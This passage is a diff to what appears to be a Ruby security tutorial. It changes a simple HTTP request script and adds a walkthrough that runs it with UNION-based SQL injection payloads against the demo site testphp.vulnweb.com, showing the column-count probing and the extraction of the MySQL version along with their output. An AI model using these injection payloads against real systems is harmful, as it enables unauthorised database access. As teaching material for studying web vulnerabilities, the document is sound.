@@ -26,11 +26,31 @@ http = Net::HTTP.new(uri.host, uri.port)
 
 request = Net::HTTP::Get.new(uri.request_uri)
 response = http.request(request)
-puts "[+] Status code: "+ response.code + "\n\n"
-puts response.body.gsub('\n\n\n\n', '').gsub(/<.*?>/, '').strip
+# puts "[+] Status code: "+ response.code + "\n\n"
+# puts response.body.gsub(/<.*?>/, '').strip
+puts response.body.scan(/<h2 id='pageName'>.*<\/h2>/).join.gsub(/<.*?>/, '').strip
 
 puts ""
 ```
+
+
+I've commented the line `puts response.body.gsub(/<.*?>/, '').strip` and added a custom one for regex for our target
+
+
+
+
+Let's to test it as we exploiting it
+
+```
+ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,NULL,NULL,NULL#" | grep -i -e warning -e error
+# => Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists.php on line 62
+ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,NULL,NULL#" | grep -i -e warning -e error
+# => 
+ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,@@VERSION,NULL#"
+# => artist: 5.1.73-0ubuntu0.10.04.1
+```
+
+
 
 
 
